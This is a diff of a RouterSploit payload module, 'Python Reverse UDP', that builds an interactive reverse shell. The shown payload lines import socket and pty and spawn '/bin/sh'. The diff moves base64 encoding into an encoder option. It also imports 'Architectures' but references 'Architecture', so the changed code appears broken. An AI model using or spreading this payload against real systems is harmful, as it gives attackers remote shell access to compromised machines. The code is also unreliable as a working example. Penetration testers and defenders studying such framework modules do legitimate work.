@@ -1,8 +1,13 @@
-from base64 import b64encode
-from routersploit.core.exploit.payloads import GenericPayload, ReverseTCPPayloadMixin
+from routersploit.core.exploit.option import OptString 
+from routersploit.core.exploit.payloads import (
+    GenericPayload,
+    Architectures,
+    ReverseTCPPayloadMixin,
+)
+from routersploit.modules.encoders.python.base64 import Encoder
 
 
-class Exploit(ReverseTCPPayloadMixin, GenericPayload):
+class Payload(ReverseTCPPayloadMixin, GenericPayload):
     __info__ = {
         "name": "Python Reverse UDP",
         "description": "Creates interactive udp reverse shell by using python.",
@@ -12,8 +17,11 @@ class Exploit(ReverseTCPPayloadMixin, GenericPayload):
         ),
     }
 
+    architecture = Architecture.PYTHON
+    encoder = OptString(Encoder(), "Encoder") 
+
     def generate(self):
-        payload = (
+        return (
             "import os\n" +
             "import pty\n" +
             "import socket\n" +
@@ -25,6 +33,3 @@ class Exploit(ReverseTCPPayloadMixin, GenericPayload):
             "pty.spawn('/bin/sh');\n" +
             "s.close()\n"
         )
-
-        encoded_payload = str(b64encode(bytes(payload, "utf-8")), "utf-8")
-        return "exec('{}'.decode('base64'))".format(encoded_payload)
